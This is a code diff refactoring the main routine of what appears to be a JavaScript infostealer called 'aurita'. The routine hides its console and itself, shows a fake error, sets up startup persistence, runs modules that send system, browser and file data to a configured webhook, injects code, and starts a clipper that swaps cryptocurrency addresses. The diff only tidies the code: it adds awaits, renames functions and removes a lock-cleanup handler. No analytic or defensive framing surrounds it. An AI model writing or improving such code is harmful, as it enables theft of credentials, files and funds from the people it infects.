@@ -27,19 +27,17 @@ const execute = async (allow, ...args) => {
     } catch (error) {
         console.error(error);
     }
-}
+};
 
 const aurita = async () => {
-    if (program.isWishRunning()) {
+    if (await program.isWishRunning()) {
         process.exit(0);
-    } else {
-        program.createUpLock();
     };
 
     await execute(hideConsole);
-    await execute(program.hideSelf);
+    await execute(program.HideSelf);
 
-    if (!program.isRunningStartupDir()) {
+    if (!(await program.IsStartupDirRunning())) {
         await execute(fakeError);
         await execute(startup);
     };
@@ -54,7 +52,7 @@ const aurita = async () => {
         CONFIG.webhook,
         CONFIG.inject
     );
-    
+
     await execute(system, CONFIG.webhook);
     await execute(browsers, CONFIG.webhook);
     await execute(commonFiles, CONFIG.webhook);
@@ -67,11 +65,6 @@ const aurita = async () => {
     await execute(wish, CONFIG.webhook);
 
     await execute(clipper, CONFIG.cryptos);
-}
-
-process.on('SIGINT', () => {
-    program.cleanUpLock();
-    process.exit(0);
-});
+};
 
 aurita();
